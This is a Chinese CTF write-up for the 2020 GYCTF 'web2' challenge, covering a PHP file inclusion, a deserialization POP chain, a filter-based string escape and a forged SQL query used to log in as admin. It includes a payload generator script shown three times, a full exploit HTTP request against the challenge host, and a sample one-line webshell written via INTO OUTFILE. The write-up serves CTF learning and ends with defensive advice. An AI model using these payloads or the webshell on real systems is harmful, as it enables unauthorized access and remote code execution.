> 2020年新春战“疫”—网络安全公益赛 web2

使用yakit扫描目录得到www.zip

发现源码有数据库地址用户密码等信息
核心思路

1. 文件包含漏洞 : index.php 中的 require_once(__DIR__."/".$_GET['action'].".php"); 存在文件包含漏洞。我们可以通过 ?action=update 来访问 update.php ，而无需登录。
2. 反序列化漏洞 : update.php 调用 User::update() ， User::update() 调用 unserialize($this->getNewinfo()) 。 getNewinfo() 从 $_POST 获取 age 和 nickname ，然后序列化一个新的 Info 对象。
3. POP 链 : 我们可以构造一个 POP (Property Oriented Programming) 链来利用这个反序列化漏洞。
   - UpdateHelper::__destruct() -> echo $this->sql (如果 $this->sql 是一个对象，会触发 __toString() )
   - User::__toString() -> $this->nickname->update($this->age)
   - Info::__call() -> $this->CtrlCase->login($argument[0])
   - dbCtrl::login() -> 执行我们构造的 SQL 语句。
4.  SQL 注入 : 我们可以通过 POP 链，让 dbCtrl::login() 执行恶意的 SQL 语句，例如 select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=? 。 c4ca4238a0b923820dcc509a6f75849b 是 1 的 MD5 值。这样，我们就可以用密码 1 登录任意用户。
5.  字符逃逸 : safe() 函数会将一些关键字替换为 hacker 。我们可以利用这个特性，构造一个序列化的字符串，在经过 safe() 函数处理后，变成我们想要的恶意的序列化字符串。

从login函数分析可知，要想能成功返回（也就是登入成功），有两种方法，一就是token=admin，二是满足passwd的md5值等于数据库中的存储值

但是token是在方法二满足后才赋值的，所以还是要用方法二

注意到login函数接收一个参数$sql，这个是执行的sql语句，默认是 “select id,password from user where username=?”，我们可以想办法让它等于 “select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?”

这样sql返回的passwd就是1的MD5值，同时我们让post的passwd等于1，不就满足条件二吗，而且条件二满足后，就会让session里的token=admin，再次登入就不会检查密码了。


这里给出反序列构造方法：

```php
<?php
class dbCtrl
{
    public $name="admin";
    public $password="1";
}
class Info{
        public $age;
    public $nickname;
    public $CtrlCase;
}
class User
{
    public $age="select 1,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?";
    public $nickname;
}
Class UpdateHelper{
    public $sql;
}
$db=new dbCtrl();

$in=new Info();
$in->CtrlCase=$db;

$user=new User();
$user->nickname=$in;

$update=new UpdateHelper();
$update->sql=$user;

function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}

$k=new Info();
$k->age=18;
$m=str_repeat("into",146);
$k->nickname=$m."\";s:8:\"CtrlCase\";".serialize($update).'}';
echo($k->nickname);
?>
```

但是如何传入这个序列化数据进行反序列化呢？由上面分析可知，源代码中会反序列化一个info类，但是那个info类我们只能传入两个参数，然后它两个参数来构造类并且反序列化。这里其实可以绕过，方法是利用反序列化字符串字符逃逸漏洞

我们让info三个参数（除了传入的两个参数，还有一个ctrlcase参数），其中一个为我们想要的序列化类即可（类中类也会一起序列化，反序列化会一起反序列化）。这里用字符逃逸漏洞，


```http
%% 这里修改时需要记得改cookie %%

POST /index.php?action=update HTTP/1.1
Host: b6e1409a-3067-4eac-bdab-5480a67df6e5.challenge.ctf.show
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=33rav178ed1epbjjr7gvipddjc
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Origin: http://b6e1409a-3067-4eac-bdab-5480a67df6e5.challenge.ctf.show
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://b6e1409a-3067-4eac-bdab-5480a67df6e5.challenge.ctf.show/index.php?action=login
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

age=18&nickname=intointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointo";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}
```
这里需要将cookie的值保存到payload中，回显时比正常页面多出10-0，说明攻击成功，这样在cookie相同的情况下网站才能识别admin的密码为1，登陆发现flag，否则其他会话不会识别出密码已修改成1.
`ctfshow{d0126b9f-a736-42a7-9134-25009a84722d}`

----



## 1. 漏洞分析

通过分析四个PHP文件，发现了以下关键漏洞点：

### 1.1 文件包含漏洞（index.php）

```php
if(isset($_GET['action'])){
    require_once(__DIR__."/".$_GET['action'].".php");
}
```

这里直接将用户输入的`action`参数拼接到文件路径中，存在本地文件包含漏洞。

### 1.2 反序列化漏洞（lib.php和update.php）

在`update.php`中：
```php
$users=new User();
$users->update();
```

在`lib.php`中的`User::update()`方法：
```php
public function update(){
    $Info=unserialize($this->getNewinfo());
    $age=$Info->age;
    $nickname=$Info->nickname;
    $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
}
```

`getNewInfo()`方法：
```php
public function getNewInfo(){
    $age=$_POST['age'];
    $nickname=$_POST['nickname'];
    return safe(serialize(new Info($age,$nickname)));
}
```

这里存在反序列化漏洞，但是序列化的字符串会经过`safe()`函数过滤。

### 1.3 字符串过滤函数（lib.php）

```php
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
```

这个函数将一些关键字替换为"hacker"，可以利用字符串替换导致的长度变化进行字符逃逸攻击。

### 1.4 POP链分析

通过分析类的魔术方法，可以构造以下POP链：

1. `UpdateHelper::__destruct()` -> `echo $this->sql`（如果`$this->sql`是对象，会触发`__toString()`）
2. `User::__toString()` -> `$this->nickname->update($this->age)`（调用不存在的方法，触发`__call()`）
3. `Info::__call()` -> `$this->CtrlCase->login($argument[0])`（可以控制参数）
4. `dbCtrl::login()` -> 执行SQL语句（可以注入恶意SQL）

## 2. 攻击思路

1. 构造一个恶意的序列化字符串，利用字符逃逸绕过`safe()`函数的过滤
2. 通过POP链，最终调用`dbCtrl::login()`函数，并传入恶意SQL语句
3. SQL语句设置为`select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?`，其中`c4ca4238a0b923820dcc509a6f75849b`是`1`的MD5值
4. 使用用户名`admin`和密码`1`登录，成功后`$_SESSION['token']`会被设置为`admin`
5. 再次访问`update.php`，获取flag

## 3. 具体步骤

### 3.1 构造Payload

```php
<?php 
 class dbCtrl 
 { 
     public $name="admin"; 
     public $password="1"; 
 } 
 class Info{ 
     public $age; 
     public $nickname; 
     public $CtrlCase; 
 } 
 class User 
 { 
     public $age="select 1,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?"; 
     public $nickname; 
 } 
 Class UpdateHelper{ 
     public $sql; 
 } 
 $db=new dbCtrl(); 
 
 $in=new Info(); 
 $in->CtrlCase=$db; 
 
 $user=new User(); 
 $user->nickname=$in; 
 
 $update=new UpdateHelper(); 
 $update->sql=$user; 
 
 function safe($parm){ 
     $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter"); 
     return str_replace($array,'hacker',$parm); 
 } 
 
 $k=new Info(); 
 $k->age=18; 
 $m=str_repeat("into",146); 
 $k->nickname=$m."\";s:8:\"CtrlCase\";".serialize($update).'}'; 
 echo($k->nickname); 
 ?> 
```

这段代码的核心原理是：
- 构造一个POP链，最终调用`dbCtrl::login()`函数
- 利用`into`被替换为`hacker`（长度增加2个字符）的特性，通过重复146次`into`，创造出292个字符的空间
- 在这个空间中注入恶意的序列化字符串，实现字符逃逸

### 3.2 发送Payload

1. 首先访问`http://b6e1409a-3067-4eac-bdab-5480a67df6e5.challenge.ctf.show/index.php?action=login`
2. 使用任意用户名和密码登录（此时会失败，但会创建session）
3. 将生成的payload作为`nickname`参数，`age`参数设为1，发送POST请求到`http://b6e1409a-3067-4eac-bdab-5480a67df6e5.challenge.ctf.show/index.php?action=update`
4. 再次访问登录页面，使用用户名`admin`和密码`1`登录
5. 登录成功后，访问`http://b6e1409a-3067-4eac-bdab-5480a67df6e5.challenge.ctf.show/index.php?action=update`获取flag

## 4. 代码详解

提供的代码是一个完整的漏洞利用生成器，下面是详细解释：

```php
<?php
class dbCtrl
{
    public $name="admin";
    public $password="1";
}
class Info{
        public $age;
    public $nickname;
    public $CtrlCase;
}
class User
{
    public $age="select 1,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?";
    public $nickname;
}
Class UpdateHelper{
    public $sql;
}
$db=new dbCtrl();

$in=new Info();
$in->CtrlCase=$db;

$user=new User();
$user->nickname=$in;

$update=new UpdateHelper();
$update->sql=$user;

function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}

$k=new Info();
$k->age=18;
$m=str_repeat("into",146);
$k->nickname=$m."\";s:8:\"CtrlCase\";".serialize($update).'}';
echo($k->nickname);
?>
```

## 5. 核心技术详解

### 5.1 字符串逃逸

**什么是字符串逃逸？**

字符串逃逸是一种在序列化/反序列化过程中，通过特定技巧改变序列化字符串结构的攻击方法。在PHP反序列化中，当序列化字符串被过滤或修改后，可能导致反序列化过程中对象结构发生变化，从而"逃逸"出原本的对象结构限制。

**为什么要逃逸？**

在本题中，`safe()`函数会过滤用户输入，将某些关键字替换为"hacker"。这种替换会导致字符串长度发生变化（例如"into"变成"hacker"，长度从4变为6）。我们需要逃逸的原因是：

1. 我们无法直接控制反序列化的对象结构，因为输入会被过滤
2. 我们需要注入自己构造的恶意对象，但直接注入会被破坏
3. 通过字符串逃逸，我们可以利用字符串长度变化，在反序列化时"跳出"原有结构的限制

**本题中的字符串逃逸原理：**

```php
$m=str_repeat("into",146);
$k->nickname=$m."\";s:8:\"CtrlCase\";".serialize($update).'}';
```

1. 当"into"被替换为"hacker"时，每次替换会增加2个字符(6-4=2)
2. 重复146次，总共增加292个字符的空间
3. 这292个字符的空间足够容纳我们后面注入的恶意序列化字符串
4. `"\";s:8:\"CtrlCase\";"` 用于关闭原始序列化结构并开始注入新的属性
5. `serialize($update)` 是我们构造的恶意对象
6. 最后的 `'}'` 用于闭合整个序列化结构

### 5.2 POP链攻击

**什么是POP链攻击？**

POP (Property-Oriented Programming) 链攻击是一种利用已有类的属性和方法，通过精心构造对象链，在反序列化过程中触发一系列预期外的方法调用，最终达到攻击目的的技术。

**为什么存在POP链攻击？**

POP链攻击存在的原因是：

1. PHP的魔术方法（如`__destruct`、`__toString`、`__call`等）会在特定条件下自动触发
2. 反序列化过程会恢复对象的所有属性，包括对其他对象的引用
3. 开发者通常不会考虑对象在反序列化后可能产生的所有调用链

**本题中的POP链是如何利用的？**

本题构造了以下POP链：

```
UpdateHelper::__destruct() → echo $this->sql
↓ (当$this->sql是对象时，会触发__toString)
User::__toString() → $this->nickname->update($this->age)
↓ (调用不存在的方法，触发__call)
Info::__call() → $this->CtrlCase->login($argument[0])
↓ (执行SQL语句)
dbCtrl::login() → 执行SQL查询
```

具体利用过程：

1. 当脚本结束时，`UpdateHelper`对象的`__destruct`方法被调用
2. `echo $this->sql`尝试输出`$sql`属性，但该属性是`User`对象
3. PHP尝试将对象转为字符串，调用`User::__toString`
4. `User::__toString`调用`$this->nickname->update($this->age)`
5. `$this->nickname`是`Info`对象，它没有`update`方法
6. PHP调用`Info::__call`魔术方法
7. `Info::__call`调用`$this->CtrlCase->login($argument[0])`
8. `$this->CtrlCase`是`dbCtrl`对象，`$argument[0]`是`User::$age`
9. 最终执行`dbCtrl::login("select 1,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?")`

### 5.3 SQL注入详解

**SQL注入代码的含义**

本题中的SQL注入代码是：

```php
public $age="select 1,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?";
```

这段代码的含义是：

1. 构造一个SQL查询，从`user`表中查询满足`username=?`条件的记录
2. 查询结果返回两个字段：常量`1`和字符串`"c4ca4238a0b923820dcc509a6f75849b"`
3. `c4ca4238a0b923820dcc509a6f75849b`是数字`1`的MD5哈希值
4. 在`dbCtrl::login`方法中，这个查询会被预处理，`?`会被替换为`$this->name`(即"admin")
5. 查询结果会被绑定到`$idResult`和`$passwordResult`变量
6. 由于我们设置了`$this->password="1"`，而`md5("1")="c4ca4238a0b923820dcc509a6f75849b"`，所以密码验证会通过

**能否修改成查询其他数据？**

是的，可以修改SQL语句查询其他数据，例如：

```php
public $age="select id,password from user where username='admin'";
```

这样可以直接查询admin用户的真实密码。

**能否执行PHP代码或实现一句话木马？**

通过这个SQL注入点直接执行PHP代码是困难的，因为：

1. 这里使用的是预处理语句，可以防止大多数SQL注入
2. 即使能注入SQL，也受限于`dbCtrl::login`方法的实现
3. MySQL不能直接执行PHP代码

但是，如果目标系统存在其他漏洞，例如：

1. 如果数据库用户有文件写入权限，可以使用`SELECT ... INTO OUTFILE`写入webshell
2. 如果存在其他文件包含漏洞，可以结合使用
3. 如果数据库支持自定义函数(UDF)，可能通过加载恶意UDF执行系统命令

例如，如果有文件写入权限，可以尝试：

```php
public $age="select \"<?php eval(\$_POST['cmd']);?>\" into outfile '/var/www/html/shell.php'";
```

但这需要：
1. MySQL用户有文件写入权限
2. Web目录可写
3. 目标路径正确
4. 预处理语句允许这种操作

在本题中，由于使用了预处理语句和参数绑定，这种攻击方式可能不可行。更实际的做法是利用已有的漏洞链获取flag。

## 6. 漏洞防御建议

1. 对于文件包含，应使用白名单方式限制可包含的文件
2. 对于反序列化，应避免直接反序列化用户输入的数据
3. 对于SQL查询，应使用参数化查询而非字符串拼接
4. 对于字符串过滤，应使用更安全的方法，如白名单过滤
5. 对于敏感操作，应实施更严格的权限控制
6. 对于魔术方法，应谨慎实现，避免在其中执行危险操作
7. 对于会话管理，应实施更严格的验证机制




----




          

        
            
toolName: todo_write
            
status: success
          
Todos updated: 7 items
          
在SQL注入攻击中，问号（?）的作用非常重要，它代表了预处理语句（Prepared Statement）中的参数占位符。这在本题中有特殊的安全意义：

### 问号（?）的作用

1. **参数占位符**：在预处理语句中，问号是一个占位符，表示后续会有一个参数值替换它。

2. **参数绑定**：在代码执行时，问号会被实际参数值替换，但这种替换是由数据库驱动安全处理的，而不是简单的字符串拼接。

3. **类型安全**：数据库会根据绑定的参数类型正确处理数据，避免类型混淆攻击。

### 在本题中的特殊意义

在本题的攻击链中，问号的使用非常巧妙：

```php
public $age="select 1,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?";
```

1. **绕过过滤**：使用问号而不是直接写入值（如`username='admin'`），可以避免在SQL语句中出现单引号，从而绕过`safe()`函数对单引号的过滤。

2. **利用已有代码**：`dbCtrl::login()`方法中已经实现了预处理语句的处理逻辑，会自动将问号替换为`$this->name`（即"admin"）。

3. **保证SQL语法正确**：使用预处理语句的格式确保了SQL语句的语法正确，不会因为字符转义等问题导致SQL语句执行失败。

4. **维持攻击隐蔽性**：使用预处理语句的形式，使攻击代码看起来更像正常的SQL查询，不容易被检测。

总的来说，在这个攻击中使用问号是为了利用目标应用程序已有的预处理语句机制，既绕过了过滤，又保证了SQL语句的正确执行，是一种非常巧妙的利用方式。这也提醒我们，即使使用了预处理语句，如果应用程序存在反序列化等其他漏洞，仍然可能被攻击者利用。


---

反序列化漏洞-代码格式
![[Pasted image 20251103215413.png]]

反序列化漏洞-魔法函数
![[0020game-gyctf web2反序列化图片.png]]

无wakeup（）
![[Pasted image 20251103215539.png]]